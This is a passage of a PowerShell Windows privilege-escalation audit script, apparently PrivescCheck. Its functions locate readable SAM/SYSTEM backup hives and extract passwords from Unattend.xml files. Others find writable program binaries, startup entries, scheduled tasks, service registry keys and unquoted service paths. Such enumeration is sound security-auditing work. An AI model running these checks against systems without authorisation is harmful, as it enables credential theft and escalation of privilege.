    [void]$ArrayOfPaths.Add($(Join-Path -Path $env:SystemRoot -ChildPath "System32\config\RegBack\system"))

    ForEach ($Path in [string[]]$ArrayOfPaths) {

        if (Test-Path -Path $Path -ErrorAction SilentlyContinue) { 

            Get-Content -Path $Path -ErrorAction SilentlyContinue -ErrorVariable GetContentError | Out-Null 

            if (-not $GetContentError) {
                $SamBackupFile = New-Object -TypeName PSObject 
                $SamBackupFile | Add-Member -MemberType "NoteProperty" -Name "Path" -Value $Path 
                $SamBackupFile
            } 
        }
    }
}

function Invoke-UnattendFilesCheck {
    <#
    .SYNOPSIS

    Enumerates Unattend files and extracts credentials 

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Searches common locations for "Unattend.xml" files. When a file is found, it calls the custom 
    "Get-UnattendSensitiveData" function to extract credentials from it. Note: credentials are only
    returned if the password is not empty and not equal to "*SENSITIVE*DATA*DELETED*".
    
    .EXAMPLE

    PS C:\> Invoke-UnattendFilesCheck | fl

    Type     : LocalAccount
    Domain   : N/A
    Username : John
    Password : Password1
    File     : C:\WINDOWS\Panther\Unattend.xml

    #>

    [CmdletBinding()] param()

    $ArrayOfPaths = New-Object System.Collections.ArrayList 
    [void]$ArrayOfPaths.Add($(Join-Path -Path $env:windir -ChildPath "Panther\Unattended.xml"))
    [void]$ArrayOfPaths.Add($(Join-Path -Path $env:windir -ChildPath "Panther\Unattend.xml"))
    [void]$ArrayOfPaths.Add($(Join-Path -Path $env:windir -ChildPath "Panther\Unattend\Unattended.xml"))
    [void]$ArrayOfPaths.Add($(Join-Path -Path $env:windir -ChildPath "Panther\Unattend\Unattend.xml"))
    [void]$ArrayOfPaths.Add($(Join-Path -Path $env:windir -ChildPath "System32\Sysprep\Unattend.xml"))
    [void]$ArrayOfPaths.Add($(Join-Path -Path $env:windir -ChildPath "System32\Sysprep\Panther\Unattend.xml"))

    ForEach ($Path in [string[]]$ArrayOfPaths) {

        if (Test-Path -Path $Path -ErrorAction SilentlyContinue) { 

            Write-Verbose "Found file: $Path"

            $Result = Get-UnattendSensitiveData -Path $Path 
            if ($Result) {
                $Result | Add-Member -MemberType "NoteProperty" -Name "File" -Value $Path 
                $Result
            }
        }
    }
}
# ----------------------------------------------------------------
# END SENSITIVE FILES 
# ----------------------------------------------------------------


# ----------------------------------------------------------------
# BEGIN INSTALLED PROGRAMS   
# ----------------------------------------------------------------
function Invoke-InstalledProgramsCheck {
    <#
    .SYNOPSIS

    Enumerates the applications that are not installed by default

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Uses the custom "Get-InstalledPrograms" function to get a filtered list of installed programs
    and then returns each result as a simplified PS object, indicating the name and the path of 
    the application.
    
    .EXAMPLE

    PS C:\> Invoke-InstalledProgramsCheck | ft

    Name            FullPath
    ----            --------
    Npcap           C:\Program Files\Npcap
    Wireshark       C:\Program Files\Wireshark
    
    #>
    
    [CmdletBinding()] param()

    $InstalledProgramsResult = New-Object System.Collections.ArrayList 

    $Items = Get-InstalledPrograms -Filtered

    ForEach ($Item in $Items) {
        $CurrentFileName = $Item.Name 
        $CurrentFileFullname = $Item.FullName
        $AppItem = New-Object -TypeName PSObject 
        $AppItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $CurrentFileName
        $AppItem | Add-Member -MemberType "NoteProperty" -Name "FullPath" -Value $CurrentFileFullname
        [void]$InstalledProgramsResult.Add($AppItem)
    }
    
    $InstalledProgramsResult
}

function Invoke-ModifiableProgramsCheck {
    <#
    .SYNOPSIS

    Identifies applications which have a modifiable EXE of DLL file

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    For each non-default application, enumerates the .exe and .dll files that the current user has 
    modify permissions on.
    
    .EXAMPLE

    PS C:\> Invoke-ModifiableProgramsCheck | ft

    ModifiablePath                      IdentityReference    Permissions
    --------------                      -----------------    -----------
    C:\Program Files\VulnApp\Packages   DESKTOP-FEOHNOM\user {WriteOwner, Delete, WriteAttributes, Synchronize...}
    C:\Program Files\VulnApp\app.exe    DESKTOP-FEOHNOM\user {WriteOwner, Delete, WriteAttributes, Synchronize...}
    C:\Program Files\VulnApp\foobar.dll DESKTOP-FEOHNOM\user {WriteOwner, Delete, WriteAttributes, Synchronize...}
    
    #>
    
    [CmdletBinding()] param()

    $Items = Get-InstalledPrograms -Filtered

    ForEach ($Item in $Items) {
        
        $SearchPath = New-Object -TypeName System.Collections.ArrayList
        [void]$SearchPath.Add([string]$(Join-Path -Path $Item.FullName -ChildPath "\*")) # Do this to avoid the use of -Depth which is PSH5+
        [void]$SearchPath.Add([string]$(Join-Path -Path $Item.FullName -ChildPath "\*\*")) # Do this to avoid the use of -Depth which is PSH5+
        
        $ChildItems = Get-ChildItem -Path $SearchPath -ErrorAction SilentlyContinue -ErrorVariable GetChildItemError 
        #$ChildItems = $Item | Get-ChildItem -Recurse -Depth 2 -ErrorAction SilentlyContinue -ErrorVariable GetChildItemError 
        
        if (-not $GetChildItemError) {

            $ChildItems | ForEach-Object {

                if ($_ -is [System.IO.DirectoryInfo]) {
                    $ModifiablePaths = $_ | Get-ModifiablePath -LiteralPaths
                } else {
                    # Check only .exe and .dll ???
                    # TODO: maybe consider other extensions 
                    if ($_.FullName -Like "*.exe" -or $_.FullName -Like "*.dll") {
                        $ModifiablePaths = $_ | Get-ModifiablePath -LiteralPaths 
                    }
                }

                if ($ModifiablePaths) {
                    ForEach ($Path in $ModifiablePaths) {
                        if ($Path.ModifiablePath -eq $_.FullName) {
                            $Path
                        }
                    }
                }
            }
        }
    }
}

function Invoke-ApplicationsOnStartupCheck {
    <#
    .SYNOPSIS

    Enumerates the applications which are run on startup

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION
    
    Applications can be run on startup or whenever a user logs on. They can be either configured
    in the registry or by adding an shortcut file (.LNK) in a Start Menu folder. 
    
    .EXAMPLE
    
    PS C:\> Invoke-ApplicationsOnStartupCheck

    Name         : SecurityHealth
    Path         : HKLM\Software\Microsoft\Windows\CurrentVersion\Run\SecurityHealth
    Data         : %windir%\system32\SecurityHealthSystray.exe
    IsModifiable : False

    Name         : VMware User Process
    Path         : HKLM\Software\Microsoft\Windows\CurrentVersion\Run\VMware User Process
    Data         : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
    IsModifiable : False
    
    #>

    [CmdletBinding()] param()

    # Is it relevant to check HKCU entries???
    #[string[]]$RegistryPaths = "HKLM\Software\Microsoft\Windows\CurrentVersion\Run", "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"
    [string[]]$RegistryPaths = "HKLM\Software\Microsoft\Windows\CurrentVersion\Run", "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"

    $RegistryPaths | ForEach-Object {

        $RegKeyPath = $_

        $Item = Get-Item -Path "Registry::$($RegKeyPath)" -ErrorAction SilentlyContinue -ErrorVariable ErrorGetItem
        if (-not $ErrorGetItem) {

            $Item | Select-Object -ExpandProperty Property | ForEach-Object {

                $RegKeyValueName = $_
                $RegKeyValueData = $Item.GetValue($RegKeyValueName, "", "DoNotExpandEnvironmentNames")

                if ($RegKeyValueData -and ($RegKeyValueData -ne '')) {

                    $ModifiablePaths = $RegKeyValueData | Get-ModifiablePath | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')}
                    if (([object[]]$ModifiablePaths).Length -gt 0) {
                        $IsModifiable = $True 
                    } else {
                        $IsModifiable = $False 
                    }
    
                    $ResultItem = New-Object -TypeName PSObject 
                    $ResultItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $RegKeyValueName
                    $ResultItem | Add-Member -MemberType "NoteProperty" -Name "Path" -Value "$($RegKeyPath)\$($RegKeyValueName)"
                    $ResultItem | Add-Member -MemberType "NoteProperty" -Name "Data" -Value $RegKeyValueData
                    $ResultItem | Add-Member -MemberType "NoteProperty" -Name "IsModifiable" -Value $IsModifiable
                    $ResultItem 
                }
            }
        }
    }

    $Root = (Get-Item -Path $env:windir).PSDrive.Root
    
    [string[]]$FileSystemPaths = "\Users\All Users\Start Menu\Programs\Startup", "\Users\$env:USERNAME\Start Menu\Programs\Startup"

    $FileSystemPaths | ForEach-Object {

        $StartupFolderPath = Join-Path -Path $Root -ChildPath $_ 

        Get-ChildItem -Path $StartupFolderPath -ErrorAction SilentlyContinue | ForEach-Object {
            $EntryName = $_.Name
            $EntryPath = $_.FullName

            if ($EntryPath -Like "*.lnk") {

                try {

                    $Wsh = New-Object -ComObject WScript.Shell
                    $Shortcut = $Wsh.CreateShortcut((Resolve-Path -Path $EntryPath))

                    $ModifiablePaths = $Shortcut.TargetPath | Get-ModifiablePath -LiteralPaths | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')}
                    if (([object[]]$ModifiablePaths).Length -gt 0) {
                        $IsModifiable = $True
                    } else {
                        $IsModifiable = $False
                    }

                    $ResultItem = New-Object -TypeName PSObject 
                    $ResultItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $EntryName
                    $ResultItem | Add-Member -MemberType "NoteProperty" -Name "Path" -Value $EntryPath
                    $ResultItem | Add-Member -MemberType "NoteProperty" -Name "Data" -Value "$($Shortcut.TargetPath) $($Shortcut.Arguments)"
                    $ResultItem | Add-Member -MemberType "NoteProperty" -Name "IsModifiable" -Value $IsModifiable
                    $ResultItem 

                } catch {
                    # do nothing
                }
            }
        }
    }
}

function Invoke-ScheduledTasksCheck {
    <#
    .SYNOPSIS
    
    Enumrates scheduled tasks with a modifiable path

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    This function enumerates all the scheduled tasks which are visible by the current user. For 
    each task, it extracts the command line and checks whether it contains a path pointing to a 
    modifiable file.
    
    .EXAMPLE

    PS C:\> Invoke-ScheduledTasksCheck

    TaskName       : DummyTask
    TaskPath       : \CustomTasks\DummyTask
    TaskFile       : C:\Windows\System32\Tasks\CustomTasks\DummyTask
    RunAs          : NT AUTHORITY\SYSTEM
    Command        : C:\APPS\MyTask.exe
    ModifiablePath : C:\APPS\
    
    #>

    [CmdletBinding()] param(
        [switch]$Filtered
    )

    function Get-ScheduledTasks {

        param (
            [object]$Service,
            [string]$TaskPath
        )

        ($CurrentFolder = $Service.GetFolder($TaskPath)).GetTasks(0)
        $CurrentFolder.GetFolders(0) | ForEach-Object {
            Get-ScheduledTasks -Service $Service -TaskPath $(Join-Path -Path $TaskPath -ChildPath $_.Name )
        }
    }

    function Convert-SidToName {

        param (
            [string]$Sid
        )

        $SidObj = New-Object System.Security.Principal.SecurityIdentifier($Sid)
        $SidObj.Translate( [System.Security.Principal.NTAccount]) | Select-Object -ExpandProperty Value
    }

    try {

        $ScheduleService = New-Object -ComObject("Schedule.Service")
        $ScheduleService.Connect()

        Get-ScheduledTasks -Service $ScheduleService -TaskPath "\" | ForEach-Object {

            if ($_.Enabled) {

                $TaskName = $_.Name
                $TaskPath = $_.Path
                $TaskFile = Join-Path -Path $(Join-Path -Path $env:windir -ChildPath "System32\Tasks") -ChildPath $TaskPath

                [xml]$TaskXml = $_.Xml
                $TaskExec = $TaskXml.GetElementsByTagName("Exec")
                $TaskCommandLine = "$($TaskExec.Command) $($TaskExec.Arguments)"
                $Principal = $TaskXml.GetElementsByTagName("Principal")

                if ($Principal.UserId) {
                    $PrincipalName = Convert-SidToName -Sid $Principal.UserId
                } elseif ($Principal.GroupId) {
                    $PrincipalName = Convert-SidToName -Sid $Principal.GroupId
                }

                if ($TaskExec.Command.Length -gt 0) {

                    if ($Filtered) {

                        $TaskCommandLine | Get-ModifiablePath | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | ForEach-Object {

                            $ResultItem = New-Object -TypeName PSObject 
                            $ResultItem | Add-Member -MemberType "NoteProperty" -Name "TaskName" -Value $TaskName
                            $ResultItem | Add-Member -MemberType "NoteProperty" -Name "TaskPath" -Value $TaskPath
                            $ResultItem | Add-Member -MemberType "NoteProperty" -Name "TaskFile" -Value $TaskFile
                            $ResultItem | Add-Member -MemberType "NoteProperty" -Name "RunAs" -Value $PrincipalName
                            $ResultItem | Add-Member -MemberType "NoteProperty" -Name "Command" -Value $TaskCommandLine
                            $ResultItem | Add-Member -MemberType "NoteProperty" -Name "ModifiablePath" -Value $_.ModifiablePath
                            $ResultItem
                        }
                    } else {

                        $ResultItem = New-Object -TypeName PSObject 
                        $ResultItem | Add-Member -MemberType "NoteProperty" -Name "TaskName" -Value $TaskName
                        $ResultItem | Add-Member -MemberType "NoteProperty" -Name "TaskPath" -Value $TaskPath
                        $ResultItem | Add-Member -MemberType "NoteProperty" -Name "TaskFile" -Value $TaskFile
                        $ResultItem | Add-Member -MemberType "NoteProperty" -Name "Command" -Value $TaskCommandLine
                        $ResultItem | Add-Member -MemberType "NoteProperty" -Name "RunAs" -Value $PrincipalName
                        $ResultItem
                    }

                } else {
                    Write-Verbose "Task '$($_.Name)' has an empty cmd line"
                }
            } else {
                Write-Verbose "Task '$($_.Name)' is disabled"
            }
        }
    } catch {
        Write-Verbose $_
    }
}

function Invoke-RunningProcessCheck {
    <#
    .SYNOPSIS

    Enumerates the running processes

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    First, it lists all the processes thanks to the built-in "Get-Process" function. Then, it 
    filters the result in order to return only the non-default Windows processes. By default,
    this function returns only process that are NOT owned by teh current user but you can 
    use the "-Self" flag to get them. 
    
    .PARAMETER Self

    Use this flag to get a list of all the process owned by the current user
    
    .EXAMPLE

    PS C:\> Invoke-RunningProcessCheck | ft

    Name                   PID User Path SessionId
    ----                   --- ---- ---- ---------
    cmd                   4224 N/A               1
    conhost               5336 N/A               1
    ctfmon                7436 N/A               1
    dllhost               3584 N/A               0
    dllhost               4172 N/A               1
    fontdrvhost            860 N/A               0
    fontdrvhost            928 N/A               1
    lsass                  732 N/A               0
    MsMpEng               3524 N/A               0
    MsMpEngCP             1132 N/A               0
    NisSrv                4256 N/A               0
    regedit               8744 N/A               1
    SearchFilterHost      9360 N/A               0
    SearchIndexer          596 N/A               0
    SearchProtocolHost      32 N/A               0
    SecurityHealthService 7980 N/A               0
    SgrmBroker            9512 N/A               0
    spoolsv               2416 N/A               0
    TabTip                7456 N/A               1
    wininit                564 N/A               0
    winlogon               676 N/A               1
    WmiPrvSE              3972 N/A               0

    #>
    
    [CmdletBinding()] param(
        [switch]
        $Self = $False
    )

    $CurrentUser = $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name 

    $IgnoredProcessNames = @("Idle", "services", "Memory Compression", "TrustedInstaller", "PresentationFontCache", "Registry", "ServiceShell", "System", 
    "csrss", # Client/Server Runtime Subsystem
    "dwm", # Desktop Window Manager
    "msdtc", # Microsoft Distributed Transaction Coordinator
    "smss", # Session Manager Subsystem
    "svchost" # Service Host
    )

    $AllProcess = Get-Process 

    ForEach ($Process in $AllProcess) {

        if (-not ($IgnoredProcessNames -contains $Process.Name )) {

            $ProcessUser = (Get-UserFromProcess -ProcessId $Process.Id).DisplayName

            $ReturnProcess = $False

            if ($Self) {
                if ($ProcessUser -eq $CurrentUser) {
                    $ReturnProcess = $True 
                }
            } else {
                if (-not ($ProcessUser -eq $CurrentUser)) {

                    # Here, I check whether 'C:\Windows\System32\<PROC_NAME>.exe' exists
                    # Not ideal but it's a quick way to check whether it's a built-in binary.
                    # There might be some issues because of the FileSystem Redirector if the script is 
                    # run from a 32-bits instance of powershell.exe (-> SysWow64 instead of System32).
                    $PotentialImagePath = Join-Path -Path $env:SystemRoot -ChildPath "System32"
                    $PotentialImagePath = Join-Path -Path $PotentialImagePath -ChildPath "$($Process.name).exe"

                    # If we can't find it in System32, add it to the list 
                    if (-not (Test-Path -Path $PotentialImagePath)) {
                        $ReturnProcess = $True 
                    }
                    $ReturnProcess = $True 
                }
            }

            if ($ReturnProcess) {
                $RunningProcess = New-Object -TypeName PSObject 
                $RunningProcess | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Process.Name 
                $RunningProcess | Add-Member -MemberType "NoteProperty" -Name "PID" -Value $Process.Id 
                $RunningProcess | Add-Member -MemberType "NoteProperty" -Name "User" -Value $(if ($ProcessUser) { $ProcessUser } else { "N/A" })
                $RunningProcess | Add-Member -MemberType "NoteProperty" -Name "Path" -Value $Process.Path 
                $RunningProcess | Add-Member -MemberType "NoteProperty" -Name "SessionId" -Value $Process.SessionId
                $RunningProcess
            }

        } else {
            Write-Verbose "Ignored: $($Process.Name)"
        }
    }
}
# ----------------------------------------------------------------
# END INSTALLED PROGRAMS   
# ----------------------------------------------------------------


# ----------------------------------------------------------------
# BEGIN SERVICES   
# ----------------------------------------------------------------
function Test-ServiceDaclPermission {
    <#
    .SYNOPSIS

    Tests one or more passed services or service names against a given permission set,
    returning the service objects where the current user have the specified permissions.

    Author: @harmj0y, Matthew Graeber (@mattifestation)
    License: BSD 3-Clause

    .DESCRIPTION

    Takes a service Name or a ServiceProcess.ServiceController on the pipeline, and first adds
    a service Dacl to the service object with Add-ServiceDacl. All group SIDs for the current
    user are enumerated services where the user has some type of permission are filtered. The
    services are then filtered against a specified set of permissions, and services where the
    current user have the specified permissions are returned.

    .PARAMETER Name

    An array of one or more service names to test against the specified permission set.

    .PARAMETER Permissions

    A manual set of permission to test again. One of:'QueryConfig', 'ChangeConfig', 'QueryStatus',
    'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', UserDefinedControl',
    'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity',
    'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead', 'AllAccess'

    .PARAMETER PermissionSet

    A pre-defined permission set to test a specified service against. 'ChangeConfig', 'Restart', or 'AllAccess'.

    .OUTPUTS

    ServiceProcess.ServiceController

    .EXAMPLE

    PS C:\> Get-Service | Test-ServiceDaclPermission

    Return all service objects where the current user can modify the service configuration.

    .EXAMPLE

    PS C:\> Get-Service | Test-ServiceDaclPermission -PermissionSet 'Restart'

    Return all service objects that the current user can restart.


    .EXAMPLE

    PS C:\> Test-ServiceDaclPermission -Permissions 'Start' -Name 'VulnSVC'

    Return the VulnSVC object if the current user has start permissions.

    .LINK
    https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
    #>
    [OutputType('ServiceProcess.ServiceController')]
    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name,

        [String[]]
        [ValidateSet('QueryConfig', 'ChangeConfig', 'QueryStatus', 'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', 'UserDefinedControl', 'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity', 'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead', 'AllAccess')]
        $Permissions,

        [String]
        [ValidateSet('ChangeConfig', 'Restart', 'AllAccess')]
        $PermissionSet = 'ChangeConfig'
    )

    BEGIN {
        $AccessMask = @{
            'QueryConfig'           = [uint32]'0x00000001'
            'ChangeConfig'          = [uint32]'0x00000002'
            'QueryStatus'           = [uint32]'0x00000004'
            'EnumerateDependents'   = [uint32]'0x00000008'
            'Start'                 = [uint32]'0x00000010'
            'Stop'                  = [uint32]'0x00000020'
            'PauseContinue'         = [uint32]'0x00000040'
            'Interrogate'           = [uint32]'0x00000080'
            'UserDefinedControl'    = [uint32]'0x00000100'
            'Delete'                = [uint32]'0x00010000'
            'ReadControl'           = [uint32]'0x00020000'
            'WriteDac'              = [uint32]'0x00040000'
            'WriteOwner'            = [uint32]'0x00080000'
            'Synchronize'           = [uint32]'0x00100000'
            'AccessSystemSecurity'  = [uint32]'0x01000000'
            'GenericAll'            = [uint32]'0x10000000'
            'GenericExecute'        = [uint32]'0x20000000'
            'GenericWrite'          = [uint32]'0x40000000'
            'GenericRead'           = [uint32]'0x80000000'
            'AllAccess'             = [uint32]'0x000F01FF'
        }
        
        $CheckAllPermissionsInSet = $False

        if($PSBoundParameters['Permissions']) {
            $TargetPermissions = $Permissions
        }
        else {
            if($PermissionSet -eq 'ChangeConfig') {
                $TargetPermissions = @('ChangeConfig', 'WriteDac', 'WriteOwner', 'GenericAll', ' GenericWrite', 'AllAccess')
            }
            elseif($PermissionSet -eq 'Restart') {
                $TargetPermissions = @('Start', 'Stop')
                $CheckAllPermissionsInSet = $True # so we check all permissions && style
            }
            elseif($PermissionSet -eq 'AllAccess') {
                $TargetPermissions = @('GenericAll', 'AllAccess')
            }
        }
    }

    PROCESS {

        ForEach($IndividualService in $Name) {

            $TargetService = $IndividualService | Add-ServiceDacl

            # We might not be able to access the Service at all so we must check whether Add-ServiceDacl returned something.
            if ($TargetService -and $TargetService.Dacl) { 

                # Enumerate all group SIDs the current user is a part of
                $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
                $CurrentUserSids += $UserIdentity.User.Value

                # Check all the Dacl objects of the current service 
                ForEach($ServiceDacl in $TargetService.Dacl) {

                    $MatchingDaclFound = $False

                    # A Dacl object contains two properties we want to check: a SID and a list of AccessRights 
                    # First, we want to check if the current Dacl SID is in the list of SIDs of the current user 
                    if($CurrentUserSids -contains $ServiceDacl.SecurityIdentifier) {

                        if($CheckAllPermissionsInSet) {

                            # If a Permission Set was specified, we want to make sure that we have all the necessary access rights
                            $AllMatched = $True
                            ForEach($TargetPermission in $TargetPermissions) {
                                # check permissions && style
                                if (($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -ne $AccessMask[$TargetPermission]) {
                                    # Write-Verbose "Current user doesn't have '$TargetPermission' for $($TargetService.Name)"
                                    $AllMatched = $False
                                    break
                                }
                            }
                            if($AllMatched) {
                                $TargetService
                                $MatchingDaclFound = $True 
                            }
                        } else {

                            ForEach($TargetPermission in $TargetPermissions) {
                                # check permissions || style
                                if (($ServiceDacl.AceType -eq 'AccessAllowed') -and ($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -eq $AccessMask[$TargetPermission]) {
                                    Write-Verbose "Current user has '$TargetPermission' permission for $IndividualService"
                                    $TargetService
                                    $MatchingDaclFound = $True 
                                    break
                                }
                            }
                        }
                    }

                    if ($MatchingDaclFound) {
                        # As soon as we find a matching Dacl, we can stop searching 
                        break
                    }
                }
            } else {
                Write-Verbose "Error enumerating the Dacl for service $IndividualService"
            }
        }
    }
}

function Invoke-InstalledServicesCheck {
    <#
    .SYNOPSIS

    Enumerates non-default services

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    It uses the custom "Get-ServiceList" function to get a filtered list of services that are 
    configured on the local machine. Then it returns each result in a custom PS object, 
    indicating the name, display name, binary path, user and start mode of the service.
    
    .EXAMPLE

    PS C:\> Invoke-InstalledServicesCheck | ft

    Name    DisplayName  ImagePath                                           User        StartMode
    ----    -----------  ---------                                           ----        ---------
    VMTools VMware Tools "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" LocalSystem Automatic

    #>
    
    [CmdletBinding()] param()

    $InstalledServicesResult = New-Object -TypeName System.Collections.ArrayList

    # Get only third-party services 
    $FilteredServices = Get-ServiceList -FilterLevel 3

    ForEach ($Service in $FilteredServices) {
        # Make a simplified version of the Service object, we only basic information for ths check.
        $ServiceItem = New-Object -TypeName PSObject 
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Service.Name
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "DisplayName" -Value $Service.DisplayName
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $Service.ImagePath
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "User" -Value $Service.User
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "StartMode" -Value $Service.StartMode
        #$ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $Service.Type
        [void]$InstalledServicesResult.Add($ServiceItem)
    }

    $InstalledServicesResult
}

function Invoke-ServicesPermissionsRegistryCheck {
    <#
    .SYNOPSIS

    Checks the permissions of the service settings in the registry

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    The configuration of the services is maintained in the registry. Being able to modify these
    registry keys means being able to change the settings of a service. In addition, a complete
    machine reboot isn't necessary for these settings to be taken into account. Only the affected
    service needs to be restarted. 
    
    .EXAMPLE

    PS C:\> Invoke-ServicesPermissionsRegistryCheck 

    Name              : VulnService
    ImagePath         : C:\APPS\MyApp\service.exe
    User              : LocalSystem
    ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VulnService}
    IdentityReference : BUILTIN\Users
    Permissions       : {WriteOwner, Delete, ReadControl, ReadData/ListDirectory...}
    Status            : Unknown
    UserCanStart      : False
    UserCanRestart    : False

    #>
    
    [CmdletBinding()] param()
    
    # Get all services except the ones with an empty ImagePath or Drivers 
    $AllServices = Get-ServiceList -FilterLevel 2 

    ForEach ($Service in $AllServices) {

        Get-ModifiableRegistryPath -Path $Service.RegistryPath | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {

            $Status = "Unknown"
            # Can we restart the service?
            $ServiceRestart = Test-ServiceDaclPermission -Name $Service.Name -PermissionSet 'Restart'
            if ($ServiceRestart) { $UserCanRestart = $True; $Status = $ServiceRestart.Status } else { $UserCanRestart = $False }
    
            # Can we start the service?
            $ServiceStart = Test-ServiceDaclPermission -Name $Service.Name -Permissions 'Start'
            if ($ServiceStart) { $UserCanStart = $True; $Status = $ServiceStart.Status } else { $UserCanStart = $False }

            $ServiceItem = New-Object -TypeName PSObject 
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Service.Name
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $Service.ImagePath
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "User" -Value $Service.User
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ModifiablePath" -Value $_.ModifiablePath
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "IdentityReference" -Value $_.IdentityReference
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Permissions" -Value $_.Permissions
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $Status
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "UserCanStart" -Value $UserCanStart
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "UserCanRestart" -Value $UserCanRestart
            $ServiceItem
        }
    }
}

function Invoke-ServicesUnquotedPathCheck {
    <#
    .SYNOPSIS

    Enumerates all the services with an unquoted path. For each one of them, enumerates paths that 
    the current user can modify. Based on the original "Get-ServiceUnquoted" function from 
    PowerUp. 

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    In my version of this function, I tried to eliminate as much false positives as possible.
    PowerUp tends to report "C:\" as exploitable whenever a program located in "C:\Program 
    Files" is identified. The problem is that we cannot write "C:\program.exe" so the service
    wouldn't be exploitable. We can only create folders in "C:\" by default.
    
    .EXAMPLE

    PS C:\> Invoke-ServicesUnquotedPathCheck

    Name              : VulnService
    ImagePath         : C:\APPS\My App\service.exe
    User              : LocalSystem
    ModifiablePath    : C:\APPS
    IdentityReference : NT AUTHORITY\Authenticated Users
    Permissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
    Status            : Unknown
    UserCanStart      : False
    UserCanRestart    : False
    
    #>
    
    [CmdletBinding()] param()

    # Get all services which have a non-empty ImagePath
    $Services = Get-ServiceList -FilterLevel 1
    
    $PermissionsAddFile = @("WriteData/AddFile", "DeleteChild", "WriteDAC", "WriteOwner")
    $PermissionsAddFolder = @("AppendData/AddSubdirectory", "DeleteChild", "WriteDAC", "WriteOwner")

    ForEach ($Service in $Services) {
        $ImagePath = $Service.ImagePath.trim()

        # If the ImagePath doesn't start with a " or a ' 
        if (-not ($ImagePath.StartsWith("`"") -or $ImagePath.StartsWith("'"))) {
            
            # Extract the binpath from the ImagePath
            $BinPath = $ImagePath.SubString(0, $ImagePath.ToLower().IndexOf(".exe") + 4)

            # If the binpath contains spaces 
            If ($BinPath -match ".* .*") {
                $ModifiableFiles = $BinPath.split(' ') | Get-ModifiablePath

                $ModifiableFiles | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
                     
                    $TempPath = $([System.Environment]::ExpandEnvironmentVariables($BinPath))
                    $TempPath = Split-Path -Path $TempPath -Parent 
                    while ($TempPath) 
                    {
                        try {
                            $ParentPath = Split-Path -Path $TempPath -Parent 
                            if ($ParentPath -eq $_.ModifiablePath) {
                                $PermissionsSet = $Null 
                                if (Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                                    # If the current folder exists, can we create files in it?
                                    #"Folder $($TempPath) exists, can we create files in $($ParentPath)???"
                                    $PermissionsSet = $PermissionsAddFile
                                } else {
                                    # The current folder doesn't exist, can we create it? 
                                    #"Folder $($TempPath) doesn't exist, can we create the folder $($ParentPath)???"
                                    $PermissionsSet = $PermissionsAddFolder 
                                }
                                ForEach ($Permission in $_.Permissions) {
                                    if ($PermissionsSet -contains $Permission) {

                                        $Status = "Unknown"
                                        # Can we restart the service?
                                        $ServiceRestart = Test-ServiceDaclPermission -Name $Service.Name -PermissionSet 'Restart'
                                        if ($ServiceRestart) { $UserCanRestart = $True; $Status = $ServiceRestart.Status } else { $UserCanRestart = $False }
                                
                                        # Can we start the service?
